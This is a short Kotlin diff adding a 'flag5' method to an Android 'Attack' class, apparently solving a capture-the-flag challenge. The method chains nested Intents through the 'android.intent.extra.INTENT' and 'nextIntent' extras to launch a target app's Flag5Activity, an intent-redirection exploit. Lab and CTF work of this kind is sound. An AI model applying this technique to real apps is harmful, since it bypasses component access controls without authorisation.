@@ -74,4 +74,27 @@ class Attack(private val context: Context) {
 			}, i * 500L)
 		}
 	}
+
+	fun flag5() {
+		val activityPath = "$packageName.activities.Flag5Activity"
+
+		val intent3 = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("reason", "back")
+		}
+
+		val intent2 = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("return", 42)
+			putExtra("nextIntent", intent3)
+		}
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			putExtra("android.intent.extra.INTENT", intent2)
+		}
+
+		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
+		context.startActivity(intent)
+	}
 }
